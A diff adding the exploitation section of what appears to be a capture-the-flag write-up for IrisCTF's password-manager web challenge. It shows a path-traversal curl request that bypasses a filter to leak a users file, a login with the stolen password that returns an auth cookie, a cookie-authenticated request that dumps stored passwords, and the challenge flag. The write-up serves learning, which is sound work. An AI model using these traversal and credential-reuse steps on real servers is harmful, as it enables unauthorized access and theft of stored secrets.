@@ -127,4 +127,76 @@ var PathReplacer = strings.NewReplacer(
 )
 ```
 
-- 
+### Exploitation-:
+
+- Users.json with path traversal
+
+```bash
+❯ curl --path-as-is https://password-manager-web.chal.irisc.tf/....//users.json
+{
+    "skat": "rf=easy-its+just&spicysines123!@"
+}
+```
+
+- Login with user `skat` and grab his cookie
+
+```bash
+❯ curl https://password-manager-web.chal.irisc.tf/login -H "Content-Type: application/json" -d '{"usr":"skat","pwd":"rf=easy-its+just&spicysines123!@"}' -v
+* Host password-manager-web.chal.irisc.tf:443 was resolved.
+* IPv6: (none)
+* IPv4: 34.32.139.120
+*   Trying 34.32.139.120:443...
+* GnuTLS ciphers: NORMAL:-ARCFOUR-128:-CTYPE-ALL:+CTYPE-X509:-VERS-SSL3.0
+* ALPN: curl offers h2,http/1.1
+* found 146 certificates in /etc/ssl/certs/ca-certificates.crt
+* found 440 certificates in /etc/ssl/certs
+* SSL connection using TLS1.3 / ECDHE_RSA_AES_256_GCM_SHA384
+*   server certificate verification OK
+*   server certificate status verification SKIPPED
+*   common name: *.chal.irisc.tf (matched)
+*   server certificate expiration date OK
+*   server certificate activation date OK
+*   certificate public key: RSA
+*   certificate version: #3
+*   subject: CN=*.chal.irisc.tf
+*   start date: Fri, 27 Dec 2024 22:43:12 GMT
+*   expire date: Thu, 27 Mar 2025 22:43:11 GMT
+*   issuer: C=US,O=Let's Encrypt,CN=R10
+* ALPN: server accepted h2
+* Connected to password-manager-web.chal.irisc.tf (34.32.139.120) port 443
+* using HTTP/2
+* [HTTP/2] [1] OPENED stream for https://password-manager-web.chal.irisc.tf/login
+* [HTTP/2] [1] [:method: POST]
+* [HTTP/2] [1] [:scheme: https]
+* [HTTP/2] [1] [:authority: password-manager-web.chal.irisc.tf]
+* [HTTP/2] [1] [:path: /login]
+* [HTTP/2] [1] [user-agent: curl/8.11.0]
+* [HTTP/2] [1] [accept: */*]
+* [HTTP/2] [1] [content-type: application/json]
+* [HTTP/2] [1] [content-length: 55]
+> POST /login HTTP/2
+> Host: password-manager-web.chal.irisc.tf
+> User-Agent: curl/8.11.0
+> Accept: */*
+> Content-Type: application/json
+> Content-Length: 55
+> 
+* upload completely sent off: 55 bytes
+< HTTP/2 200 
+< date: Sat, 04 Jan 2025 07:17:12 GMT
+< content-type: text/plain; charset=utf-8
+< content-length: 2
+< set-cookie: auth=eyJ1c3IiOiJza2F0IiwicHdkIjoicmY9ZWFzeS1pdHMranVzdFx1MDAyNnNwaWN5c2luZXMxMjMhQCJ9
+< strict-transport-security: max-age=31536000; includeSubDomains
+< 
+* Connection #0 to host password-manager-web.chal.irisc.tf left intact
+```
+
+- Make a request to route `getpasswords` to find the flag
+
+```bash
+❯ curl https://password-manager-web.chal.irisc.tf/getpasswords -H "Cookie: auth=eyJ1c3IiOiJza2F0IiwicHdkIjoicmY9ZWFzeS1pdHMranVzdFx1MDAyNnNwaWN5c2luZXMxMjMhQCJ9"
+[{"Password":"mypasswordisskat","Title":"Discord","URL":"https://example.com","Username":"skat@skat.skat"},{"Password":"irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}","Title":"RF-Quabber Forum","URL":"https://example.com","Username":"skat"},{"Password":"this-isnt-a-real-password","Title":"Iris CTF","URL":"https://2025.irisc.tf","Username":"skat"}]
+```
+
+- Flag-:`irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}`
